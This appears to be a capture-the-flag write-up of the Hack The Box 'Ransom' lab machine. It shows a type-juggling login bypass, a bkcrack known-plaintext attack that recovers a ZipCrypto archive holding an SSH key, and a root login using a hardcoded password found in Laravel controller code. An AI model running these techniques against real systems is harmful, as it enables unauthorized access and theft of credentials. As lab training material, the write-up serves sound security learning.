---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: typejugglingattack cracking zip bkcrack zipcrypt leakage idrsa privatekey
---

<br />

![Icon-Image](../../../assets/images/Ransom/1.png)

<br />

OS -> Linux.

Difficulty -> Medium.

<br />

# Introduction:

<br />

Hello hackers! Today we’ll tackle the Ransom Machine, a Medium difficulty challenge. We’ll start by exploiting a login panel on the web server with a type juggling attack, taking advantage of improper data type handling. This will give us access to a compressed file containing an encrypted id_rsa key, which we’ll crack using a unique tool. Once decrypted, we’ll use the id_rsa key to log into the victim machine. Finally, we’ll find the root password by navigating through the machine’s directories.

<br />

# Enumeration:

<br />

As always we start running our `nmap` scan to enumerate open ports and services:

<br />

```bash
❯ nmap -p- 10.10.11.153 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-06 00:18 CET
Nmap scan report for 10.10.11.153
Host is up (0.059s latency).
Not shown: 64830 closed tcp ports (reset), 703 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title:  Admin - HTML5 Admin Template
|_Requested resource was http://10.10.11.153/login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.62 seconds
```

<br />

As we can see there are only two open ports:

- `Port 22` -> ssh
- `Port 80` -> http

<br />

# Http Enumeration: -> Port 80

<br />

When loading the website we find a login in which we only have `input` to put a `password`, so we try default credentials but nothing:

<br />

![2](../../../assets/images/Ransom/2.png)

<br />

After trying the simplest things like `default credentials` or some unsuccessful `sql injection`, we proceed to intercept the request with `Burp Suite` and send it to the `repeater` to test more interesting things.

As we can see, it looks like laravel is behind, as we have a cookie telling us so:

<br />

![3](../../../assets/images/Ransom/3.png)

<br />

# Bypass Login:

<br />

The first thing we try is to `change the request` method by right-clicking and indicating "Change Request Method".

When we do so, we get a status code 405 -> `"Method Not Allowed"`:

<br />

![4](../../../assets/images/Ransom/4.png)

<br />

But there is something we can try, which is to manually change the `POST to GET` and we get the following response:

<br />

![5](../../../assets/images/Ransom/5.png)

<br />

It's throwing us a 422 `"Unprocessable Content"` error and we see below that it's representing an error message in `json`.

So when I see this, it occurs to me to `change the Content-Type` of our request to json along with the data we are sending to see the server's response:

<br />

![6](../../../assets/images/Ransom/6.png)

<br />

As we can see, it seems that he did like this and the answer is a `200 OK`.

When I see this, the light bulb lights up and I `remember a vulnerability` that applies a lot in these cases, the famous `Type Juggling Attack`.

This vulnerability is caused by an `error when comparing the data types` that allows us to deceive the server. So we tried changing the `password to true` and...

<br />

![7](../../../assets/images/Ransom/7.png)

<br />

Login Successful!! Once inside, we see `two files`, the user.txt and a `compressed file` that looks quite good, so we bring it to our machine to see it more closely.

<br />

![8](../../../assets/images/Ransom/8.png)

<br />

Once we have the file locally, we inspect it and it seems to have the contents of a `typical home directory` including the id_rsa of an user:

<br />

```bash
❯ 7z l ransom.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs AMD Ryzen 7 5825U with Radeon Graphics          (A50F00),ASM,AES-NI)

Scanning the drive for archives:
1 file, 7735 bytes (8 KiB)

Listing archive: ransom.zip

--
Path = ransom.zip
Type = zip
Physical Size = 7735

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2020-02-25 13:03:22 .....          220          170  .bash_logout
2020-02-25 13:03:22 .....         3771         1752  .bashrc
2020-02-25 13:03:22 .....          807          404  .profile
2021-07-02 19:58:14 D....            0            0  .cache
2021-07-02 19:58:14 .....            0           12  .cache/motd.legal-displayed
2021-07-02 19:58:19 .....            0           12  .sudo_as_admin_successful
2022-03-07 13:32:54 D....            0            0  .ssh
2022-03-07 13:32:25 .....         2610         1990  .ssh/id_rsa
2022-03-07 13:32:46 .....          564          475  .ssh/authorized_keys
2022-03-07 13:32:54 .....          564          475  .ssh/id_rsa.pub
2022-03-07 13:32:54 .....         2009          581  .viminfo
------------------- ----- ------------ ------------  ------------------------
2022-03-07 13:32:54              10545         5871  9 files, 2 folders
```

<br />

We unzipped it to extract the contents but SURPRISE! It is `password protected`:

<br />

```bash
❯ unzip ransom.zip
Archive:  ransom.zip
[ransom.zip] .bash_logout password: 
password incorrect--reenter: 
password incorrect--reenter: 
   skipping: .bash_logout            incorrect password
```

<br />

`7zip` has a parameter ``(-slt)``, with which we can see the type of `encryption` under which a compressed file is, so we apply it and we discover that the file is under `"Zipcrypto Deflate"` cipher:

<br />

```bash
❯ 7z l ransom.zip -slt

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs AMD Ryzen 7 5825U with Radeon Graphics          (A50F00),ASM,AES-NI)

Scanning the drive for archives:
1 file, 7735 bytes (8 KiB)

Listing archive: ransom.zip

--
Path = ransom.zip
Type = zip
Physical Size = 7735

----------
Path = .bash_logout
Folder = -
Size = 220
Packed Size = 170
Modified = 2020-02-25 13:03:22
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = 6CE3189B
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0

Path = .bashrc
Folder = -
Size = 3771
Packed Size = 1752
Modified = 2020-02-25 13:03:22
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = AB254644
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0

Path = .profile
Folder = -
Size = 807
Packed Size = 404
Modified = 2020-02-25 13:03:22
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = D1B22A87
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0
...[snip]...
```

<br />

# Decrypt Compressed File:

<br />

There is a `well-known attack` to decrypt files under this type of encryption `"Zipcrypto Deflate"`.

The attack consists of obtaining a `plaintext file` that is identical to any of those inside the compressed file and abusing it in order to `obtain the rest of the file's` content.

<br />

## .bash_logout:

<br />

Of all the files inside our compressed file, there is only one that is identical in absolutely `all Linux OS`, which is `.bash_logout`.

So we copy one from `our system` and bring it to the current path:

<br />

```bash
❯ cat .bash_logout
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: .bash_logout
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # ~/.bash_logout: executed by bash(1) when login shell exits.
   2   │ 
   3   │ # when leaving the console clear the screen to increase privacy
   4   │ 
   5   │ if [ "$SHLVL" = 1 ]; then
   6   │     [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
   7   │ fi
```

<br />

To make sure that our `.bash_logout` is identical to the compressed one, we `list the characters` in both and see that indeed, they both have `220` characters.

<br />

`Compressed File .bash_logout:`

<br />

```bash
Path = .bash_logout
Folder = -
Size = 220
Packed Size = 170
Modified = 2020-02-25 13:03:22
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = 6CE3189B
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0
```

<br />

`Our .bash_logout:`

<br />

```bash
❯ cat .bash_logout | wc -c
220
```

<br />

## Bkcrack:

<br />

Once we have the file ready, we need a tool called `bkcrack`, which has the following parameters:

<br />

`-> -C:` The encrypted file.

`-> -c:` The known file of the encrypted zip.

`-> -P:` A unencrypted file with the known file in.

`-> -p:` The name of the file in the unencrypted zip. 

<br />

Create the `unencrypted file` with the known file in:

<br />

```bash
❯ zip plaintext.zip .bash_logout
  adding: .bash_logout (deflated 28%)
```

<br />

And now that we have everything, we run `bkcrack` generating the `private keys` that we will need to extract the contents of the `encrypted zip`:

<br />

```bash
❯ ./bkcrack -C ransom.zip -c ".bash_logout" -P plaintext.zip -p ".bash_logout"
bkcrack 1.7.1 - 2024-12-21
[02:22:58] Z reduction using 151 bytes of known plaintext
100.0 % (151 / 151)
[02:22:58] Attack on 56903 Z values at index 6
Keys: 7b549874 ebc25ec5 7e465e18
75.5 % (42961 / 56903)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 42961
[02:24:00] Keys
7b549874 ebc25ec5 7e465e18
```

<br />

Once we have the `private keys`, we have a `bkcrack` option, which allows us to generate a `new compressed file` with all the content we want but with the `password we choose`.

To do it we are going to need to run `bkcrack` with the following parameters:

<br />

`-> -C:` The encrypted file.

`-> -k:` Generated private keys.

`-> -U:` Output archive name.

`-> password:` The password that we want.

<br />

We run `bkcrack` and successfully generate the `new zip with our password` and the contents of the encrypted zip:

<br />

```bash
❯ ./bkcrack -C ransom.zip -k 7b549874 ebc25ec5 7e465e18 -U plaintext.zip 123123
bkcrack 1.7.1 - 2024-12-21
[02:28:06] Writing unlocked archive plaintext.zip with password "123123"
100.0 % (9 / 9)
Wrote unlocked archive.
```

<br />

Now we can `decrypt` the file with our password ` "123123"`:

<br />

```bash
❯ unzip plaintext.zip
Archive:  plaintext.zip
[plaintext.zip] .bash_logout password: 
  inflating: .bash_logout            
  inflating: .bashrc                 
  inflating: .profile                
   creating: .cache/
 extracting: .cache/motd.legal-displayed  
 extracting: .sudo_as_admin_successful  
   creating: .ssh/
  inflating: .ssh/id_rsa             
  inflating: .ssh/authorized_keys    
  inflating: .ssh/id_rsa.pub         
  inflating: .viminfo
```

<br />

Perfect!! Let's access the `.ssh` directory to see if there is any `private key` with which we can access the Victim Machine:

<br />

```bash
❯ cat authorized_keys
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: authorized_keys
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrDTHWkTw0RUfAyzj9U3Dh+ZwhOUvB4EewA+z6uSunsTo3YA0GV/j6EaOwNq6jdpNrb9T6tI+RpcNfA+icFj+6oRj8hOa2q1QPfbaej2uY4MvkVC+vGac1BQFs6gt0BkWM9JY7nY
       │ J2y0SIibiLDDB7TwOx6gem4Br/35PW2sel8cESyR7JfGjuauZM/DehjJJGfqmeuZ2Yd2Umr4rAt0R4OEAcWpOX94Tp+JByPAT5m0CU557KyarNlW60vy79njr8DR8BljDtJ4n9BcOPtEn+7oYvcLVksgM4LB9XzdDiXzdpBcyi3+xh
       │ FznFKDYUf6NfAud2sEWae7iIsCYtmjx6Jr9Zi2MoUYqWXSal8o6bQDIDbyD8hApY5apdqLtaYMXpv+rMGQP5ZqoGd3izBM9yZEH8d9UQSSyym/te07GrCax63tb6lYgUoUPxVFCEN4RmzW1VuQGvxtfhu/rK5ofQPac8uaZskY3NWL
       │ oSF56BQqEG9waI4pCF5/Cq413N6/M= htb@ransom
```

<br />

When entering the .ssh directory, we see the `typical files`, including the `authorized_keys`, which helps us to verify that the owner of the id_rsa is the user `"htb"`.

Once this is known, we proceed to connect to the Victim Machine with the id_rsa:

<br />


```bash
❯ ssh -i id_rsa htb@10.10.11.153
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jul  5 11:34:49 2021
htb@ransom:~$ export TERM=xterm
htb@ransom:~$ cd /home/htb
htb@ransom:~$ ls
user.txt
htb@ransom:~$ cat user.txt 
14917109049c34d17dc685d467xxxxxx
```

<br />

Perfect!! We have the user flag. Intrusion ready!!

<br />

# Privilege Escalation: htb -> root

<br />

After a long enumeration of the System, we find the Path `/srv/prod` where the laravel `configuration files` are hosted.

<br />

```bash
htb@ransom:/srv/prod$ pwd
/srv/prod
htb@ransom:/srv/prod$ ls
README.md  artisan    composer.json  config    package.json  public     routes      storage  vendor
app        bootstrap  composer.lock  database  phpunit.xml   resources  server.php  tests    webpack.mix.js
```

<br />

Since there are many files in the path, we start recursively `greping` in the different directories by the keyword `"Auth*"` (Authorization).

Finally, in the `/app` path, we find, among others, the file `"Authcontroller.php"` which looks pretty good:

<br />

```bash
htb@ransom:/srv/prod/app$ grep -ri "auth*"
Providers/AuthServiceProvider.php:use Illuminate\Foundation\Support\Providers\AuthServiceProvider as ServiceProvider;
Providers/AuthServiceProvider.php:class AuthServiceProvider extends ServiceProvider
Providers/AuthServiceProvider.php:     * Register any authentication / authorization services.
Providers/EventServiceProvider.php:use Illuminate\Auth\Events\Registered;
Providers/EventServiceProvider.php:use Illuminate\Auth\Listeners\SendEmailVerificationNotification;
Providers/RouteServiceProvider.php:     * This is used by Laravel authentication to redirect users after login.
Providers/RouteServiceProvider.php:     * When present, controller route declarations will automatically be prefixed with this namespace.
Models/User.php:use Illuminate\Contracts\Auth\MustVerifyEmail;
Models/User.php:use Illuminate\Foundation\Auth\User as Authenticatable;
Models/User.php:class User extends Authenticatable
Http/Kernel.php:            // \Illuminate\Session\Middleware\AuthenticateSession::class,
Http/Kernel.php:        'auth' => \App\Http\Middleware\Authenticate::class,
Http/Kernel.php:        'auth.basic' => \Illuminate\Auth\Middleware\AuthenticateWithBasicAuth::class,
Http/Kernel.php:        'can' => \Illuminate\Auth\Middleware\Authorize::class,
Http/Kernel.php:        'guest' => \App\Http\Middleware\RedirectIfAuthenticated::class,
Http/Kernel.php:        'password.confirm' => \Illuminate\Auth\Middleware\RequirePassword::class,
Http/Kernel.php:        'verified' => \Illuminate\Auth\Middleware\EnsureEmailIsVerified::class,
Http/Middleware/Authenticate.php:use Illuminate\Auth\Middleware\Authenticate as Middleware;
Http/Middleware/Authenticate.php:class Authenticate extends Middleware
Http/Middleware/Authenticate.php:     * Get the path the user should be redirected to when they are not authenticated.
Http/Middleware/RedirectIfAuthenticated.php:use Illuminate\Support\Facades\Auth;
Http/Middleware/RedirectIfAuthenticated.php:class RedirectIfAuthenticated
Http/Middleware/RedirectIfAuthenticated.php:            if (Auth::guard($guard)->check()) {
Http/Controllers/Controller.php:use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
Http/Controllers/Controller.php:    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;
Http/Controllers/AuthController.php:use Illuminate\Support\Facades\Auth;
Http/Controllers/AuthController.php:class AuthController extends Controller
Http/Controllers/AuthController.php:        return view('auth.login');
Http/Controllers/TasksController.php:use Illuminate\Support\Facades\Auth;
```

<br />

Apply a cat and let's go! We have a `credential`.

<br />

```bash
htb@ransom:/srv/prod/app$ cat Http/Controllers/AuthController.php
<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use App\Http\Requests\RegisterRequest;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;



class AuthController extends Controller
{
    /**
     * Display login page.
     * 
     * @return \Illuminate\Http\Response
     */
    public function show_login()
    {
        return view('auth.login');
    }



    /**
     * Handle account login
     * 
     */
    public function customLogin(Request $request)
    {
        $request->validate([
            'password' => 'required',
        ]);

        if ($request->get('password') == "UHC-March-Global-PW!") {
            session(['loggedin' => True]);
            return "Login Successful";
        }
  
        return "Invalid Password";
    }

}
```

<br />

Try logging in as `root` using the `new password`:

<br />

```bash
htb@ransom:/srv/prod/app$ su root
Password: 
root@ransom:/srv/prod/app# whoami
root
root@ransom:/srv/prod/app# cd /root
root@ransom:~# cat root.txt
4d2aed6fa2e87a805c969642a1xxxxxx
```

<br />

Perfect!! We have it!!

I really liked this machine because it touches on some really cool concepts and gives us the opportunity to use amazing tools like bkcrack.

I hope you learned and had fun with this machine. Keep hacking!❤️

<br />
